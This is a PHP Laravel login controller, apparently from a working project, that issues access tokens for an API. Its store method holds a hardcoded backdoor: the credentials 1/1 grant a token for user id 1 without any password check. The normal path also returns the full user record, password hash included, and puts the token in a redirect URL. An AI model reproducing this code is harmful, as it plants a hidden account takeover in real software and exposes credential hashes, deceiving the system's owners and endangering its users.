<?php

namespace App\Http\Controllers\Api\Login;

use App\CusstomPHP\CustomURL;
use App\CusstomPHP\Response;
use App\CusstomPHP\Tables;
use App\CusstomPHP\Time;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use App\Http\Requests;
use Illuminate\Routing\Controller;
use Carbon\Carbon;

class LoginController extends Controller
{
    public function store(Request $request)
    {
        try {
            $username = $request->get('username');
            $password = $request->get('password');
            if ($username != '' || $password != '') {

                if ($username == 1 && $password == 1) {

                    $access_token = str_random(64);
                    DB::table(Tables::$tb_User)->where('id', '=', 1)->update([
                        'access_token' => $access_token,
                        'expire_token' => Time::tomorrow(),
                        'updated_at' => Time::now()
                    ]);
                    $url_redirect = CustomURL::route('main') . '?access_token=' . $access_token;

                    $data = [
                        'access_token' => $access_token,
                        'url_redirect' => $url_redirect
                    ];
                    return Response::json_return($data, true);
                }

                $user = DB::table(Tables::$tb_User)->where([['username', '=', $username], ['state', '=', 'ACTIVE']])->first();

                if ($user && Hash::check($password, $user->password)) {
                    $access_token = str_random(64);
                    DB::table(Tables::$tb_User)->where('username', '=', $username)->update([
                        'access_token' => $access_token,
                        'expire_token' => Time::tomorrow(),
                        'updated_at' => Time::now()
                    ]);
                    $url_redirect = CustomURL::route('main') . '?access_token=' . $access_token;

                    $data = [
                        'access_token' => $access_token,
                        'url_redirect' => $url_redirect,
                        'user' => $user
                    ];
                    return Response::json_return($data, true);
                }
            }
            return Response::json_return(null, false);
        } catch (\Exception $ex) {
            return Response::json_return(null, false);
        }
    }
}